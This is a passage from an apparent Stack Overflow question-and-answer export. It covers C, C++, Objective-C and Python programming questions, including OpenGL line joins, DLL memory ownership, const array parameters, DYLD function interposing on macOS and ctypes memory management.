  <p><strong>Possible Duplicate:</strong><br>
  <a href=""http://stackoverflow.com/questions/4391033/return-value-from-local-scope"">Return value from local scope?</a>  </p>
</blockquote>



<pre><code>#include &lt;stdio.h&gt;

int main() {
        int x = ({int a = 2; a;});
        printf(""%d\n"", x);
}
</code></pre>

<p>Output: <strong>2</strong></p>
","9530","","<p>It's a non-standard extension to the C/C++ languages provided by GCC called <a href=""http://gcc.gnu.org/onlinedocs/gcc/Statement-Exprs.html#Statement-Exprs"" rel=""nofollow"">statement expressions</a>.  If you attempt to compile with the <code>-pedantic</code> flag, you'll get the warning ""ISO C forbids braced-groups within expressions"".  It is <strong>not</strong> portable code and should be avoided if possible.  </p>
"
"<p>How come when I run this main.cpp:</p>

<pre><code>#include &lt;iostream&gt;
#include &lt;typeinfo&gt;

using namespace std;

struct Blah
{};

int main()
{
  cout &lt;&lt; typeid(Blah).name() &lt;&lt; endl;
  return 0;
}
</code></pre>

<p>using gcc version 4.4.4</p>

<p>by compiling it like:</p>

<p><code>g++ main.cpp</code></p>

<p>I get this:</p>

<p><code>4Blah</code>   &lt;-- what is that 4 doing there?</p>

<p>On Visual C++ 2008, I would get:</p>

<p><code>struct Blah</code>    &lt;--- expected</p>

<p>Is there a way to make it just print</p>

<p><code>Blah</code> or <code>struct Blah</code>?</p>
","9530","","<p>As others have said, the result here is <em>implementation-defined</em>, meaning that the implementation (i.e., the compiler toolchain) is free to define it how it wants, so long as it documents that somewhere.</p>

<p>From the C++ standard, section 18.5.1/1 [lib.type.info]:</p>

<blockquote>
  <p>The class <code>type_info</code> describes type information generated by the implementation. Objects of this class
  effectively store a pointer to a name for the type, and an encoded value suitable for comparing two types for
  equality or collating order. The names, encoding rule, and collating sequence for types are all unspecified
  and may differ between programs.</p>
</blockquote>
"
"<p><img src=""http://i.stack.imgur.com/ooHbJ.jpg"" alt=""alt text"">I'm having problems with the GL_LINES block... the lines in the sample below do not connect on the ends (although sometimes it randomly decides to connect a corner or two). Instead, the endpoints come within 1 pixel of one another (leaving a corner that is not fully squared; if that makes sense). It is a simple block to draw a solid 1-pixel rectangle.</p>

<pre><code> glBegin(GL_LINES);

  glColor3b(cr, cg, cb);

  glVertex3i(pRect-&gt;left, pRect-&gt;top, 0);
  glVertex3i(pRect-&gt;right, pRect-&gt;top, 0);

  glVertex3i(pRect-&gt;right, pRect-&gt;top, 0);
  glVertex3i(pRect-&gt;right, pRect-&gt;bottom, 0);

  glVertex3i(pRect-&gt;right, pRect-&gt;bottom, 0);
  glVertex3i(pRect-&gt;left, pRect-&gt;bottom, 0);

  glVertex3i(pRect-&gt;left, pRect-&gt;bottom, 0);
  glVertex3i(pRect-&gt;left, pRect-&gt;top, 0);

 glEnd();
</code></pre>

<p>The sample below seems to correct the problem, giving me sharp, square corners; but I can't accept it because I don't know why it's acting this way...</p>

<pre><code> glBegin(GL_LINES);

  glColor3b(cr, cg, cb);

  glVertex3i(pRect-&gt;left, pRect-&gt;top, 0);
  glVertex3i(pRect-&gt;right + 1, pRect-&gt;top, 0);

  glVertex3i(pRect-&gt;right, pRect-&gt;top, 0);
  glVertex3i(pRect-&gt;right, pRect-&gt;bottom + 1, 0);

  glVertex3i(pRect-&gt;right, pRect-&gt;bottom, 0);
  glVertex3i(pRect-&gt;left - 1, pRect-&gt;bottom, 0);

  glVertex3i(pRect-&gt;left, pRect-&gt;bottom, 0);
  glVertex3i(pRect-&gt;left, pRect-&gt;top - 1, 0);

 glEnd();
</code></pre>

<p>Any OpenGL programmers out there that can help, I would appreciate it :)</p>

<p>The picture is a zoomed-in view of a screenshot. As you can see, the top left corner is not connected. The top right corner is. Not see are the bottom left and right, which are not connected.</p>

<p>The viewport is setup to a 1 to 1 pixel per coordinate.</p>

<pre><code>glDisable(GL_DEPTH_TEST);
glDisable(GL_LIGHTING);
glMatrixMode(GL_PROJECTION);
glPushMatrix();
glLoadIdentity();
glOrtho(0, __nRendererWidth, __nRendererHeight, 0, -1, 100);
glMatrixMode(GL_MODELVIEW);
glPushMatrix();
glLoadIdentity();
glEnable (GL_TEXTURE_2D);
</code></pre>
","9530","","<p>From <a href=""http://www.opengl.org/resources/faq/technical/rasterization.htm#rast0090"">question 14.090 of the OpenGL FAQ</a>:</p>

<blockquote>
  <p><strong>14.090 How do I obtain exact pixelization of lines?</strong></p>
  
  <p>The OpenGL specification allows for a wide range of line rendering hardware, so exact pixelization may not be possible at all.</p>
  
  <p>You might want to read the OpenGL specification and become familiar yourself with the diamond exit rule. Being familiar with this rule will give you the best chance to obtain exact pixelization. Briefly, the diamond exit rule specifies that a diamond-shaped area exists within each pixel. A pixel is rasterized by a line only if the mathematical definition of that line exits the diamond inscribed within that pixel.</p>
</blockquote>

<p>Then from section 3.5 of the <a href=""http://www.opengl.org/registry/doc/glspec41.core.20100725.pdf"">OpenGL Core Profile specification</a>:</p>

<blockquote>
  <p>Because the initial and final conditions of the diamond-exit rule may be difficult to implement, other line segment rasterization algorithms are allowed, subject to the following rules:</p>
  
  <ol>
  <li>The coordinates of a fragment produced by the algorithm may not deviate by more than one unit in either x or y window coordinates from a corresponding fragment produced by the diamond-exit rule.</li>
  <li>The total number of fragments produced by the algorithm may differ from that produced by the diamond-exit rule by no more than one.</li>
  <li>For an x-major line, no two fragments may be produced that lie in the same window-coordinate column (for a y-major line, no two fragments may appear in the same row).</li>
  <li>If two line segments share a common endpoint, and both segments are either x-major (both left-to-right or both right-to-left) or y-major (both bottom-to- top or both top-to-bottom), then rasterizing both segments may not produce duplicate fragments, nor may any fragments be omitted so as to interrupt continuity of the connected segments.</li>
  </ol>
</blockquote>

<p>So, the answer is the the specification does not require lines to be joined as you might expect.  If your lines were all x-major or all y-major, then rule #4 above would give you the expected output, but in your rectangle, you're alternating between x-major and y-major lines.</p>

<p>If you want to guarantee connected lines with no gaps or overlaps, you should render with <code>GL_LINE_LOOP</code> (or <code>GL_LINE_STRIP</code> for a connected series that does not end where it starts) instead of <code>GL_LINES</code>.</p>
"
"<p>I have an objective-c class with member variables. I am creating getters and setters for each one. Mostly for learning purposes. My setter looks like the following:</p>

<pre><code>- (void) setSomething:(NSString *)input {
 something = input;
}
</code></pre>

<p>However, in C++ and other languages I have worked with in the past, you can reference the member variable by using the <code>this</code> pointer like <code>this-&gt;something = input</code>. In objective-c this is known as <code>self</code>.  So I was wondering if something like that is possible in objective-c? Something like this:</p>

<pre><code>- (void) setSomething:(NSString *)input {
 [self something] = input;
}
</code></pre>

<p>But that would call the getter for <code>something</code>. So I'm not sure. So my question is:</p>

<p><em><strong>Is there a way I can do assignment utilizing the self pointer?</em></strong></p>

<p>If so, how?</p>

<p>Is this good practice or is it evil?</p>

<p>Thanks!</p>
","9530","","<p>Yes, it uses the same syntax as C++, with <code>self</code> in place of <code>this</code>:</p>

<pre><code>self-&gt;something = input;
</code></pre>
"
"<p>If my DLL has the implementation of one of my classes, if I do new and delete on it is that okay? When is the problem regarding DLLs and who allocates what?</p>

<p>What if that class calls new?</p>

<pre><code>    class InDLL {
    A* something;

    InDLL()
    {
       something = new A;
    }
    };

    ...

    //me

InDLL dll = new InDLL(); //problem?
</code></pre>

<p>Thanks</p>
","9530","","<p>The one important rule is that <strong>whoever allocates memory is responsible for freeing that memory, using the same allocator</strong>.  There are no restrictions on how the memory must be allocated (it can be allocated by the main executable, by your DLL, or by some other DLL), but once it's allocated, the same module must free it.</p>

<p>The most important instance where you need to remember this is if your DLL has an exported function that returns a pointer to newly allocated memory.  When you do that, you must also export a corresponding function to free that memory.  For example:</p>

<pre><code>// In mydll.dll:
class MyClass { ... };

MyClass * DLLEXPORT NewMyClass()
{
    return new MyClass;
}

void DLLEXPORT FreeMyClass(MyClass *obj)
{
    delete obj;
}
</code></pre>

<p>What you <strong>cannot</strong> do is allocate the memory in one module (say, by calling <code>NewMyClass()</code> above from the main executable) and free it in another module (e.g. the main executable):</p>

<pre><code>// THIS CODE IS BUGGY, DO NOT USE:
HMODULE mydll = LoadLibrary(""mydll.dll"");
MyClass (*NewMyClass)() = (MyClass (*)())GetProcAddress(mydll, ""NewMyClass"");
MyClass *obj = NewMyClass();  // allocate inside DLL
...
delete obj;  // BOOM!
</code></pre>

<p>The reason for this is that <strong>different modules can be (and frequently are) linked against different, incompatible versions of the C/C++ runtime libraries</strong>.  When that happens, the different modules have different ideas of how the heap works, and their implementations of <code>malloc</code>/<code>free</code> or <code>operator new</code>/<code>operator delete</code> may not agree.</p>

<p>For more information, see also <a href=""http://blogs.msdn.com/b/oldnewthing/archive/2006/09/15/755966.aspx"" rel=""nofollow"">Allocating and freeing memory across module boundaries</a>.</p>
"
"<p>So, I'm messing around with some interposing code on OSX (gcc 4.2.1) and I'm trying to get the following to work:</p>

<p>When I call ./login using the DYLD_INSERT_LIBRARIES=my.dylib, it should override the default login implementation and use my custom implementation. Granted this is a contrived example, but its just to help me understand the point. </p>

<p>My source:</p>

<blockquote>
  <p>cat libinterposers.c </p>
</blockquote>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
#include ""login.h""

typedef struct interpose_s
{
  void *new_func;
  void *orig_func;
} interpose_t;

int my_open(const char *, int, mode_t);
int my_close(int);
int my_login();


static const interpose_t interposers[] __attribute__ ((section(""__DATA, __interpose""))) = 
{
     { (void *)my_open,  (void *)open  },
     { (void *)my_close, (void *)close },
     { (void *)my_login, (void *)login },
};

int my_login()
{
  printf(""--&gt; my_login()\n"");
  return 1;
}

int my_open(const char *path, int flags, mode_t mode)
{
  int ret = open(path, flags, mode);
  printf(""--&gt; %d = open(%s, %x, %x)\n"", ret, path, flags, mode);
  return ret;
}

int my_close(int d)
{
  int ret = close(d);
  printf(""--&gt; %d = close(%d)\n"", ret, d);
  return ret;
}
</code></pre>

<blockquote>
  <p>cat login.c</p>
</blockquote>

<pre><code>#include &lt;stdio.h&gt;
#include ""login.h""

int login()
{
  return -1;
}

int main()
{
  if (login() == 1)
  {
    printf(""login successful\n"");
  }
  else
  {
    printf(""login failed\n"");
  }
}
</code></pre>

<p>And finally, login.h</p>

<pre><code>int login();
</code></pre>

<p>Now when I execute with something like ""cat /dev/null"" it works fine ...</p>

<pre><code>DYLD_INSERT_LIBRARIES=/tmp/libinterposers.dylib cat /dev/null
--&gt; 3 = open(/dev/null, 0, 0)
--&gt; 0 = close(3
</code></pre>

<p>However, when I run with my ./login example</p>

<pre><code>DYLD_INSERT_LIBRARIES=/tmp/libinterposers.dylib ./login
login failed
</code></pre>

<p>As you can see, it just prints login failed, my custom ""my_login"" function never runs ... any ideas? Thanks in advance!</p>
","9530","","<p>Your <code>login</code> function is linked statically, not dynamically, so there's nothing to interpose.  You can't interpose statically linked functions.  If you want this to work, you'll need to move <code>login</code> to its own dynamic library.</p>
"
"<p>When using Python CTypes there are the Structures, that allow you to clone c-structures on the Python side, and the POINTERS objects that create a sofisticated Python Object from a memory address value and can be used to pass objects by reference back and forth C code.</p>

<p>What I could not find on the documentation or elsewhere is what happens when a Python object containing a Structure class that was de-referenced from a returning pointer from C Code (that is - the C function alocated memory for the structure) is itself deleted.  Is the memory for the original C structure freed? If not how to do it?</p>

<p>Furthermore -- what if the Structure contains Pointers itself, to other data that was also allocated by the C function? Does the deletion of the Structure object frees the Pointers onits members? (I doubt so) Else - -how to do it? Trying to call the system ""free"" from Python for the Pointers in the Structure is crashing Python for me.</p>

<p>In other words, I have this structure filled up by a c Function call:</p>

<pre><code>class PIX(ctypes.Structure):
    """"""Comments not generated
    """"""
    _fields_ = [
        (""w"", ctypes.c_uint32),
        (""h"", ctypes.c_uint32),
        (""d"", ctypes.c_uint32),
        (""wpl"", ctypes.c_uint32),
        (""refcount"", ctypes.c_uint32),
        (""xres"", ctypes.c_uint32),
        (""yres"", ctypes.c_uint32),
        (""informat"", ctypes.c_int32),
        (""text"", ctypes.POINTER(ctypes.c_char)),
        (""colormap"", ctypes.POINTER(PIXCOLORMAP)),
        (""data"", ctypes.POINTER(ctypes.c_uint32))
    ]
</code></pre>

<p>And I want to free the memory it is using up from Python code.</p>
","9530","","<p>The memory is not freed, because Python has no idea if or how it should be freed.  Compare these two functions:</p>

<pre><code>void testfunc1(PIX *pix)
{
    static char staticBuffer[256] = ""static memory"";
    pix-&gt;text = staticBuffer;
}

void testfunc2(PIX *pix)
{
    pix-&gt;text = (char *)malloc(32);
    strcpy(pix-&gt;text, ""dynamic memory"");
}
</code></pre>

<p>Used like this:</p>

<pre><code>pix1, pix2 = PIX(), PIX()
mylib.testfunc1(ctypes.byref(pix1))
mylib.testfunc2(ctypes.byref(pix2))
</code></pre>

<p>And then at some point, <code>pix1</code> and <code>pix2</code> go out of scope.  When that happens, nothing happens to the inner pointers—if they pointed to dynamic memory (as is the case here with <code>pix2</code> but <em>not</em> <code>pix1</code>), you are responsible for freeing it.</p>

<p>The proper way to solve this problem is, if you allocate dynamic memory in your C code, you should provide a corresponding function that deallocates that memory.  For example:</p>

<pre><code>void freepix(PIX *pix)
{
    free(pix-&gt;text);
}


pix2 = PIX()
mylib.testfunc2(ctypes.byref(pix2))
...
mylib.freepix(ctypes.byref(pix2))
</code></pre>
"
"<p>This is what I have been using in WIndows:</p>

<pre><code>#include &lt;ctime&gt;
#include &lt;iostream&gt;

int main( void )
{
    using namespace std;

    clock_t lastT;
    lastT = clock();

    cin.get();
    cin.get();
    return 0;
}
</code></pre>

<p>In Linux I get the error:</p>

<pre><code>'clock_t' was not declared in this scope
</code></pre>

<p>Is there some other data type for this in Linux?</p>

<p>I am compiling it in Anjuta IDE by clicking Run.</p>
","9530","","<p>Your IDE/compiler is not compliant.  The C++ standard requires the <code>&lt;ctime&gt;</code> header to be identical to the C99 header <code>&lt;time.h&gt;</code>, except that symbols are placed in the <code>std</code> namespace (C++03, §17.4.1.2/4).  C99 §7.23.1/3 requires <code>&lt;time.h&gt;</code> to declare <code>clock_t</code> to be an arithmetic type capable of representing time.</p>

<p>So, if your implementation does not declare <code>clock_t</code>, it is not compliant with the C++ standard.</p>
"
"<p>how can I search a list of tuples if I only know 1 element of any tuple in the list?</p>

<p>mockup example (this doesn't work):</p>

<pre><code>tuplelist = [('cat', 'dog'), ('hello', 'goodbye'), ('pretty', 'ugly')]
matchlist = []
searchstring = 'goodbye'

if (*, searchstring) in tuplelist:
    print ""match was found""
    matchlist.append(tuplelist[#index of match])
</code></pre>

<p>the asterix would be where I want to put the wildcard</p>

<p>I know I could use:</p>

<pre><code>for i in range (len(tuplelist)):
    if tuplelist[i][1]==searchstring:
        matchlist.append(tuplelist[i])
        print ""match was found""
</code></pre>

<p>but the problem is that I need to run a specific function only once if no match is found.</p>

<p>maybe I could make a counter that increments when a match is found and add something like this to the loop.</p>

<pre><code>    if i==len(tuplelist) and matchcounter==0:
        #do something
        print ""no match was found""
</code></pre>

<p>But that's kind of ugly and confusing I think and I'm sure there's some cleaner way to do this :P</p>
","9530","","<p>You could use a list comprehension to generate a new list of only the elements you care about.  For example:</p>

<pre><code>tuplelist = [('cat', 'dog'), ('hello', 'goodbye'), ('pretty', 'ugly')]
if 'goodbye' in (x[1] for x in tuplelist):
    print ""match was found""
</code></pre>

<p>This takes the list of tuples and constructs the list (actually a generator expression) containing only the second elements from each tuple; then it tests the search string for membership in that new list.</p>
"
"<p><strong>Task</strong>: Print numbers from 1 to 1000 without using any loop or conditional statements. Don't just write the <code>printf()</code> or <code>cout</code> statement 1000 times.</p>

<p>How would you do that using C or C++?</p>
","9530","","<p>Preprocessor abuse!</p>

<pre><code>#include &lt;stdio.h&gt;

void p(int x) { printf(""%d\n"", x); }

#define P5(x) p(x); p(x+1); p(x+2); p(x+3); p(x+4);
#define P25(x) P5(x) P5(x+5) P5(x+10) P5(x+15) P5(x+20)
#define P125(x) P25(x) P25(x+50) P25(x+75) P25(x+100)
#define P500(x) P125(x) P125(x+125) P125(x+250) P125(x+375)

int main(void)
{
  P500(1) P500(501)
  return 0;
}
</code></pre>

<p>The preprocessed program (see it with <code>gcc -E input.c</code>) is amusing.</p>
"
"<p>There are 2 non-template classes A, B having some static template methods.</p>

<p>From class A static method in B is called and from class B static method from A is called. The source coude only for illustration (not real code)...</p>

<p>A.h</p>

<pre><code>#include ""B.h""
class A 
{
 public:
   template &lt;class T&gt;
   void f1 ()
   {
      T var1= ...;
      T var2 = B::f4(T);
   }

   template &lt;class T&gt;
   T f2()
   {
      return ...
   }
};

#include ""A.h""
class B
{
 public:
   template &lt;class T&gt;
   void f3 ()
   {
      T var1= ...;
      T var2 = A::f2(T); //Error
   }

   template &lt;class T&gt;
   T f4()
   {
      return ...
   }
};
</code></pre>

<p>I am having troubles with g++ compiler in NetBeans. During the compilation the following error occurs: Error: incomplete type A used in nested name specifier, g++.</p>

<p>I tried to add forward declarations into both classes, but nothing was successfull. 
There is an older bug:</p>

<p><a href=""http://gcc.gnu.org/ml/gcc-bugs/2005-02/msg01383.html"">http://gcc.gnu.org/ml/gcc-bugs/2005-02/msg01383.html</a></p>

<p>Thanks for your help...</p>
","9530","","<p>You have a circular dependency between your header files.  Since your classes are so tightly intertwined, I'd suggest merging them into a single header file, structured like this:</p>

<pre><code>class A
{
public:
  template &lt;class T&gt;
  void f1();
};

class B
{
  ...
};

template &lt;class T&gt;
void A::f1()
{
  // Use full definition of class B
}
</code></pre>

<p>If you insist on using separate header files for A and B (which won't really make any difference since they end up including each other), you'll need to restructure them so that one of the headers doesn't include the other, so at least one of the dependent template functions will need to be defined in a separate file.  For example:</p>

<pre><code>// File ""a_no_b.h""
class A
{
public:
  template &lt;typename T&gt;
  void f1();
};

// File ""b_no_a.h""
class B
{
public:
  template &lt;typename T&gt;
  void f3();
};

// File ""a.h""
#include ""a_no_b.h""
#include ""b_no_a.h""

template &lt;typename T&gt;
void A::f1()
{
  // Use full definition of class B
}

// File ""b.h""
#include ""b_no_a.h""
#include ""a_no_b.h""

template &lt;typename T&gt;
void B::f3()
{
  // Use full definition of class A
}
</code></pre>
"
"<p>Ehllo,</p>

<p>I'm getting some strange warning about this code:</p>

<pre><code>typedef double mat4[4][4];

void mprod4(mat4 r, const mat4 a, const mat4 b)
{
/* yes, function is empty */
}

int main()
{
    mat4 mr, ma, mb;
    mprod4(mr, ma, mb);
}
</code></pre>

<p>gcc output as follows:</p>

<pre><code>$ gcc -o test test.c
test.c: In function 'main':
test.c:13: warning: passing argument 2 of 'mprod4' from incompatible pointer
type
test.c:4: note: expected 'const double (*)[4]' but argument is of type 'double
(*)[4]'
test.c:13: warning: passing argument 3 of 'mprod4' from incompatible pointer
type
test.c:4:
note: expected 'const double (*)[4]' but argument is of type 'double
(*)[4]'
</code></pre>

<p>defining the function as:</p>

<pre><code>void mprod4(mat4 r, mat4 a, mat4 b)
{
}
</code></pre>

<p>OR defining matrices at main as:</p>

<pre><code>mat4 mr;
const mat4 ma;
const mat4 mb;
</code></pre>

<p>OR calling teh function in main as:</p>

<pre><code>mprod4(mr, (const double(*)[4])ma, (const double(*)[4])mb);
</code></pre>

<p>OR even defining mat4 as:</p>

<pre><code>typedef double mat4[16];
</code></pre>

<p>make teh warning go away. Wat is happening here? Am I doing something invalid?</p>

<p>gcc version is 4.4.3 if relevant.</p>

<p>I also posted on gcc bugzilla: <a href=""http://gcc.gnu.org/bugzilla/show_bug.cgi?id=47143"" rel=""nofollow"">http://gcc.gnu.org/bugzilla/show_bug.cgi?id=47143</a></p>

<p>My current workaround consist in making ugly macros that cast stuff for me:</p>

<pre><code>#ifndef _NO_UGLY_MATRIX_MACROS

#define mprod4(r, a, b) mprod4(r, (const double(*)[4])a, (const double(*)[4])b)

#endif
</code></pre>

<p>Thanks for your attention.</p>

<hr>

<p>Answer from Joseph S. Myers on gcc bugzilla:</p>

<blockquote>
  <p>Not a bug.  The function parameters
  are of type ""pointer to array[4] of
  const double"" because const on an
  array type applies to the element
  type, recursively, and then the
  outermost array type, only, of a
  parameter of array type decays to a
  pointer, and the arguments passed are
  of type ""pointer to array[4] of
  double"" after array-to-pointer decay,
  and the only case where qualifiers are
  permitted to be added in assignment,
  argument passing etc. is qualifiers on
  the immediate pointer target, not
  those nested more deeply.</p>
</blockquote>

<p>Sounds pretty confusing to me, sounds liek function expects:</p>

<pre><code>pointer to array[4] of const doubles
</code></pre>

<p>and we are passing</p>

<pre><code>pointer to const array[4] of doubles
</code></pre>

<p>intead.</p>

<p>Or would it be the inverse? Teh warnings suggest that teh function expects a:</p>

<pre><code>const double (*)[4]
</code></pre>

<p>which seems to me moar liek a</p>

<pre><code>pointer to const array[4] of doubles
</code></pre>

<p>.</p>

<p>I'm really confused with this answer, somebody who can understand what he said could clarify and exemplify?</p>

<p>Thanks again for your attention</p>
","9530","","<p>To explain what Joseph said: the function is expecting a <code>pointer to array[4] of const double</code> to be passed in, but you're passing in a <code>pointer to array[4] of double</code>.  These types are not compatible, so you get an error.  They look like they should be compatible, but they're not.</p>

<p>For the purposes of passing parameters to functions (or for variable assignments), you can always convert an <code>X</code> to a <code>const X</code>, or a <code>pointer to X</code> to a <code>pointer to const X</code> for any type <code>X</code>.  For example:</p>

<pre><code>int x1 = 0;
const int x2 = x1;  // ok
int *x3 = &amp;x1;
const int *x4 = x3;  // ok: convert ""pointer to int"" to ""pointer to const int""
int **x5 = &amp;x3;
const int **x6 = x5;  // ERROR: see DigitalRoss's answer
int *const *x7 = x5;  // ok: convert ""pointer to (pointer to int)"" to
                      //             ""pointer to const (pointer to int)""
</code></pre>

<p>You're only allowed to add qualifiers (that is, the <code>const</code>, <code>volatile</code>, and <code>restrict</code> qualifiers) to the <em>first</em> level of pointers.  You can't add them to higher levels of pointers because, as <a href=""http://stackoverflow.com/questions/4573349/c-function-const-multidimensional-array-argument-strange-warning/4573484#4573484"">DigitalRoss mentioned</a>, doing so would allow you to accidentally violate const-correctness.  This is what Joseph means by ""the only case where
qualifiers are permitted to be added in assignment, argument passing etc. is
qualifiers on the immediate pointer target, not those nested more deeply.""</p>

<p>So, bringing us back to Joseph's response, you can't convert a <code>pointer to array[4] of double</code> to a <code>pointer to array[4] of const double</code> because there is no type <code>X</code> such that you're converting from <code>pointer to X</code> to <code>pointer to const X</code>.</p>

<p>If you try using <code>array[4] of double</code> for <code>X</code>, you'd see that you <em>can</em> convert to <code>pointer to const array[4] of double</code>, which is a different type.  However, no such type exists in C: you can have an array of a <code>const</code> type, but there is no such thing as a <code>const array</code>.</p>

<p>Hence, there's no way to perfectly solve your problem.  You'll have to either add casts to all of your function calls (either manually or via a macro or helper function), rewrite your functions to not take <code>const</code> parameters (bad since it doesn't let you pass in <code>const</code> matrices), or change the <code>mat4</code> type to be either a 1-dimensional array or a structure, as <a href=""http://stackoverflow.com/questions/4573349/c-function-const-multidimensional-array-argument-strange-warning/4573903#4573903"">user502515 suggested</a>.</p>
"
"<p>I am in the planning stages of creating a fighting game and am unsure how to handle one issue relating to memory.</p>

<p>Background info:<br>
- Still debating whether to use C# (XNA) or C++. We do not want to commit to either until we have explored how to solve this problem in both languages.<br>
- Using a max of 256MB RAM would be great if possible.<br>
- Two characters will be present at a time, and these characters can only change between battles. There is time to load/free memory between battles, but the game needs to run at a constant 60 drawn frames per second during combat. Each frame is 16.67ms<br>
- The total number of images per character is in the low hundreds. Each image is roughly 200x400 pixels. Only one image from each character will be displayed at any given moment.</p>

<p>Uncompressed, each image takes roughly 300kb from my calculations; upwards of 100MB for a whole character. This is pushing too close to the 256MB limit given that memory will be needed for some other resources as well.</p>

<p>Since each image can be made with a total of 16 colors. Theoretically I should be able to use 1/8th the space if I can take advantage of this. I've looked around but haven't found any word of native support for paletted images. (Storing each pixel using fewer bits that each map to a 32-bit RGBa color)</p>

<p>We tried using DXT compression, however, the compression artifacts are quite noticeable.</p>

<p>I was considering making my own file format with 4 bits per pixel (and some extra palette info), loading all the images of this new format into RAM before battle, and then when drawing any specific image, decompress only that image into a raw image so it can be rendered properly. I don't know if it's realistic to perform so many assignment operations (appx 200x400 for each character = 160k) each frame. It sounds very hacky to me.</p>

<p>Does anyone have advice on whether my solution sounds reasonable, and if there is perhaps a better one available?</p>

<p>Thanks so much!</p>

<p>(I also attempted to use an image with only 1 channel, then use a shader to perform a series of if statements to translate various values into other colors. Unfortunately, there were too many lines of code for the shader. It is also rather hacky and does not scale well.)</p>
","9530","","<p>Use <a href=""http://en.wikipedia.org/wiki/S3_Texture_Compression"" rel=""nofollow"">S3 Texture Compression</a> (aka DXTn) instead.  S3TC lets you store textures at 4 bits/pixel or 8 bits/pixel, and it's supported natively by graphics cards.  You don't have to worry about decompressing it on the fly, since the graphics card does that.</p>

<p>DirectX has very good support for S3TC, in both C++ and C#.</p>
"
"<p>============================================</p>

<h1>Fixed</h1>

<p><strong>Manage to get this corrected heres the correct way of doing this for future viewers: <a href=""http://pastebin.com/uM0z8Q2v"" rel=""nofollow"">http://pastebin.com/uM0z8Q2v</a></strong></p>

<p>============================================</p>

<p>source:
<a href=""http://pastebin.com/utL7Ebeq"" rel=""nofollow"">http://pastebin.com/utL7Ebeq</a></p>

<p>My thinking is that if i run from controller class ""main""
it will allow me to take the ""data"" from Class ""model"", def ""filename"". 
It doesn't seem to work. As you can see below what i mean</p>

<pre><code>class Controller:
    def __init__(self):
        self.model = Model()
        self.view = View()
    def main(self):
        data = self.model.filename()
        self.view.tcpdump(data)
class View:
    def tcpdump(self, command):
        subprocess.call(command.split(), shell=False)
</code></pre>

<p>When i run my code i get this error:</p>

<pre><code>subprocess.call(command.split(), shell=False)
AttributeError: 'NoneType' object has no attribute 'split'
</code></pre>

<p>My guess means that its not picking up command (look at source for reference) or that its not getting command with variables. But i know the error when variables are not being picked up so i don't think it is that. </p>

<p>My question is, from what i have thus far, how do i from ""class view"" grab ""command"" for my subprocesses to run.</p>

<p>Thanks~</p>

<p>John Riselvato</p>
","9530","","<p>You're not returning anything from <code>filename()</code>.  When you don't return anything, <code>None</code> is returned instead, so the parameter <code>command</code> to <code>tcpdump</code> is <code>None</code>, which gives you the error: you can't call <code>split()</code> on the <code>None</code> object.</p>

<p>Change the <code>filename()</code> function in the <code>Model</code> class to return a string.</p>
"
"<p>In a function that I am writing I am trying to return a pointer to a vector of unsigned chars.  The relevant code is below.</p>

<pre><code>std::vector&lt;unsigned char&gt; *ret = new std::vector&lt;unsigned char&gt;(buffSize,'0');
//Due to suggestions...
int n = recvfrom(fd_, ret, buffSize, &amp;recvAddress, &amp;sockSize);
//Forgot to include this in the original
ret-&gt;resize(n);
// display chars somehow just for testing
for(std::vector&lt;unsigned char&gt;::iterator it=ret-&gt;begin(); it&lt;ret-&gt;end();it++)
{
    std::cout&lt;&lt;*it;
}
std::cout&lt;&lt;std::endl;
...
return ret;
</code></pre>

<p>When I run this through valgrind I get errors talking about how the buffer in recvfrom is pointing to uninitialized bytes.  I've narrowed this down to the vector since I swapped it out for an unsigned char array and everything works fine.  Any suggestions?</p>

<p>Edit 1:  Fixed some of the code, was doing this from memory/notes with a problem that I was having at work.  The reason I started to use valgrind was that I was getting a segmentation fault at that spot.  I will double check what I was doing tomorrow.</p>
","9530","","<p>This line is wrong:</p>

<pre><code>int n = recvfrom(fd_, ret, buffSize, &amp;recvAddress, &amp;sockSize);
</code></pre>

<p>It should be:</p>

<pre><code>int n = recvfrom(fd_, &amp;(*ret)[0], buffSize, &amp;recvAddress, &amp;sockSize);
</code></pre>

<p>You're reading data directly onto the <code>std::vector</code> data structure, which is typically 3 pointers (beginning, end, and end-of-storage).  So, you're overwriting those 3 pointers with data received over the socket, and then you're overwriting random memory after the vector.  The compiler doesn't complain because any pointer type (<code>std::vector&lt;char&gt; *</code> in this case) is implicitly convertible to a <code>void*</code> (the second parameter to <code>recvfrom</code>).</p>

<p>You of course want to read data into the buffer pointed to by the vector, which is obtained by taking the address of its first element, namely <code>&amp;(*ret)[0]</code>.  We have to add the awkward parentheses because brackets <code>[]</code> have higher operator precedence than the unary dereferencing operator <code>*</code>.</p>
"
"<pre><code>#include &lt;windows.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;tchar.h&gt;
#ifdef __cplusplus
extern ""C""
#endif
void * _ReturnAddress(void);

#pragma intrinsic(_ReturnAddress)
//I inserted the following code inside one of the functions

void func()
{
------------
-------
----
-
    HMODULE module_handle;
    TCHAR module_name[4096];
    DWORD flag = 0x00000004;

    GetModuleHandleEx(flag, (LPCTSTR) _ReturnAddress(), &amp;module_handle);

    GetModuleFileName(module_handle,module_name,4096);

-----
--
}
</code></pre>

<p>When I compile the code as a separate project everything works fine. Please help.</p>
","9530","","<p>Even if you get your code to compile, what you're doing smells of wrongness.</p>

<p>If you're using the return address to make any sort of security-related decision, <strong>stop</strong>.  <a href=""http://blogs.msdn.com/b/oldnewthing/archive/2004/01/01/47042.aspx"" rel=""nofollow"">You can't trust the return address of the calling function</a>.  No really, <a href=""http://blogs.msdn.com/b/oldnewthing/archive/2006/08/17/704232.aspx"" rel=""nofollow""><strong>you can't trust the return address of the calling function</strong></a>.</p>
"
"<p>When I use this line:</p>

<pre><code>m = imaplib.IMAP4(""some host"")
</code></pre>

<p>I get this error:</p>

<pre><code> m = imaplib.IMAP4(""some host"")
  File ""C:\Python25\lib\imaplib.py"", line 163, in __init__
    self.open(host, port)
  File ""C:\Python25\lib\imaplib.py"", line 230, in open
    self.sock.connect((host, port))
  File ""&lt;string&gt;"", line 1, in connect
error: (10061, 'Connection refused')
</code></pre>

<p>How would I do error handling for this error?</p>
","9530","","<p>Use a standard <code>try/except</code> block:</p>

<pre><code>import socket

try:
    m = imaplib.IMAP4(""some host"")
except socket.error, e:
    print ""Error opening IMAP connection: "", e
</code></pre>
"
"<p><br>
I want to find out whether or not a certain process is sleeping or not (C++/Windows).<br>
I'm trying to use the suspend count to do so and suspending to process before the check for<br>
profiling processes.  </p>

